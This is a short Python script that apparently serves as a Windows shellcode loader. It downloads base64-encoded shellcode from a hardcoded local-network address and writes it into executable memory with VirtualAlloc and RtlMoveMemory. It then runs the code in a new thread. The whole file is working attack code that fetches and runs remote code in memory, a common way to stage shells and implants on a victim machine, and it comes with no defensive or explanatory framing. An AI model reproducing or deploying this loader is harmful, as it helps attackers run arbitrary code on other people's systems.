from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(shellcode):
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                        buf,
                                        ctypes.c_int(len(shellcode)))
 
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

def run(shellcode):
    write_memory(shellcode)
if __name__ == "__main__":
    url = "http://192.168.1.7:8100/shell.exe"
    shellcode = get_code(url)
    run(shellcode)